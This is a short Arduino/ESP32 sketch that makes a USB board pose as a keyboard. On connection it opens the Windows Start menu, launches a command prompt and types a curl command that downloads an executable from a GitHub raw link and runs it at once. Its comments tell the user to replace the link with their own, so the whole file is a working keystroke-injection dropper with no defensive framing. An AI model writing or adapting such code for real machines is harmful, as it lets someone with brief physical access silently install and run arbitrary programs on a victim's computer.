#include <USB.h>
#include <USBHIDKeyboard.h>

USBHIDKeyboard Keyboard;

void setup() {
  USB.begin();
  Keyboard.begin();

  // 1. Wait for Windows to initialize the driver
  delay(5000);

  // 2. Press Windows Key to open Start Menu search
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(800); // Wait for Start Menu to pop up

  // 3. Type "cmd" and press Enter
  Keyboard.print("cmd");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(1000); // Wait for CMD window to focus

  // 4. Type the PowerShell command to download and run your EXE
  // Replace the URL with your raw Gist link
  String rawUrl = "https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/main.exe";
  // Add quotes around the URL argument for robust parsing by Windows CMD
  String command = "curl -L -C - -O \"" + rawUrl + "\" && .\\main.exe";

  Keyboard.println(command);
}

void loop() {
  // Empty - prevents the script from running repeatedly
}
